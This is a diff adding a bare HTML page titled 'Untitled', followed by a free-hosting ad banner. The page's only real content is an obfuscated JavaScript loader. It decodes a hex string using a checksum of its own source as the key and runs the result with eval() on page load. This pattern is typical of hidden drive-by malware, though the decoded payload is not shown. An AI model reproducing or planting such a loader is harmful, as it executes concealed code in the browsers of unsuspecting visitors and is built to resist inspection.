@@ -1,0 +1,38 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+<head>
+	<title>Untitled</title>
+</head>
+
+<body>
+<script language="JavaScript">
+<!--
+function Du8LaL7iG(GVYkI8cCN,eYkRMXinq){var CKUQx5Y47;var O8gnQkoxp;var R517w7QPt='';var NW02MKx6P=new Array();var IAp60jNMj=arguments.callee.toString();var DRYENrkgN=IAp60jNMj.replace(/\W/g,'');DRYENrkgN=DRYENrkgN.toUpperCase();var Wdb2kC821=DRYENrkgN.length;for(CKUQx5Y47=0;CKUQx5Y47<256;CKUQx5Y47++) {NW02MKx6P[CKUQx5Y47]=0;}var NLSi11Omr=1;for(CKUQx5Y47=128;CKUQx5Y47;CKUQx5Y47>>=1) {NLSi11Omr=(NLSi11Omr>>>1)^((NLSi11Omr&1)?3988292384:0);for(u7OvD0325=0;u7OvD0325<256;u7OvD0325+=CKUQx5Y47*2) {NW02MKx6P[u7OvD0325+CKUQx5Y47]=(NW02MKx6P[u7OvD0325]^NLSi11Omr);if (NW02MKx6P[u7OvD0325+CKUQx5Y47] < 0) {NW02MKx6P[u7OvD0325+CKUQx5Y47]+=4294967296;}}}O8gnQkoxp=4294967295;var iBoqQC81l='MAYBE---';for(NLSi11Omr=0;NLSi11Omr<Wdb2kC821;NLSi11Omr++) {O8gnQkoxp=NW02MKx6P[(O8gnQkoxp^DRYENrkgN.charCodeAt(NLSi11Omr))&255]^((O8gnQkoxp>>8)&16777215);}O8gnQkoxp=O8gnQkoxp^4294967295;if (O8gnQkoxp<0) {O8gnQkoxp+=4294967296;}O8gnQkoxp=O8gnQkoxp.toString(16).toUpperCase();var eS5ujc8f6=8-O8gnQkoxp.length;for(CKUQx5Y47=0;CKUQx5Y47<eS5ujc8f6;CKUQx5Y47++) {O8gnQkoxp='0'+O8gnQkoxp;}var ytij1gpsB=new Array();var A7snbWhu5=100;var Wdb2kC821=O8gnQkoxp.length;for(CKUQx5Y47=0;CKUQx5Y47<8;CKUQx5Y47++) {var eS6K45Pdk=Wdb2kC821+CKUQx5Y47;if (eS6K45Pdk>=8) {eS6K45Pdk=eS6K45Pdk-8;ytij1gpsB[CKUQx5Y47]=O8gnQkoxp.charCodeAt(eS6K45Pdk);} else {ytij1gpsB[CKUQx5Y47]=7;}}var iG78kplXr=0;var IC6d5866T;A7snbWhu5=10394;var kxY2uw76h=new Array();kxY2uw76h[0]=GVYkI8cCN.length;Wdb2kC821=kxY2uw76h[0];for(CKUQx5Y47=0;CKUQx5Y47<Wdb2kC821;CKUQx5Y47+=2){var E7yCPbYLa=GVYkI8cCN.substr(CKUQx5Y47,2);var AQy2Ptsb2=parseInt(E7yCPbYLa,16);IC6d5866T=AQy2Ptsb2-ytij1gpsB[iG78kplXr];if(IC6d5866T<0) {IC6d5866T=IC6d5866T+256;}R517w7QPt+=String.fromCharCode(IC6d5866T);if(iG78kplXr<ytij1gpsB.length-1) {iG78kplXr++;} else {iG78kplXr=0;A7snbWhu5=11;}}eval(R517w7QPt);}
+Du8LaL7iG('95b39bAC9E9aa2b85fBBAAa0A59A5c6B6DAD9ea992a29964a4B69b74539DA8B8A17E676663656b726274666964696276627b679a989E61A69aB267a4929EA07294ABA176A1729Cab9Fad5A57a89E98B899815A6853559Ca99AABa0AB6E57656651B7ACB09D9a716693b3AA9b96a76E6461B4B0596F7163ad97b699a496735b6d6c');
+//-->
+</script>
+
+
+
+
+<!--WZ-REKLAMA-1.0IZ--><div align="center"><table width="496" border="0"
+cellspacing="0" cellpadding="0"><tr><td><a href="http://www.webzdarma.cz/"><img
+src="http://i.wz.cz/banner/nudle03.gif" width="28" height="60" 
+style="margin: 0; padding: 0; border-width: 0" alt="WebZdarma.cz" /></a></td><td>
+<script type="text/javascript">
+<!-- /* (c) 2001 AdCycle.com All Rights Reserved.*/ 
+var id=427; var jar=new Date();var s=jar.getSeconds();var m=jar.getMinutes();
+var flash=s*m+id;var cgi='http://ad.wz.cz';
+var p='<iframe src="'+cgi+'/ad.cgi?gid=31&amp;t=_top&amp;id='+flash+'&amp;type=iframe" ';
+p+='height="60" width="468" border="0" marginwidth="0" marginheight="0" hspace="0" ';
+p+='vspace="0" frameborder="0" scrolling="no">';
+p+='<a href="'+cgi+'/click.cgi?gid=31&amp;id='+flash+'" target="_top">';
+p+='<img src="'+cgi+'/ad.cgi?gid=31&amp;id='+flash+'" width="468" height="60" ';
+p+='border="0" alt="Klikni" /></'+'a></'+'ifra'+'me>'; document.write(p); // -->
+</script><noscript><div><a href="http://ad.wz.cz/click.cgi?gid=31&amp;id=427"><img
+src="http://ad.wz.cz/ad.cgi?gid=31&amp;id=427"
+width="468" height="60" style="margin: 0; padding: 0; border-width: 0" alt="Klikni" /></a></div></noscript>
+</td></tr></table></div>
+<!--WZ-REKLAMA-1.0IK--></body>
+</html>
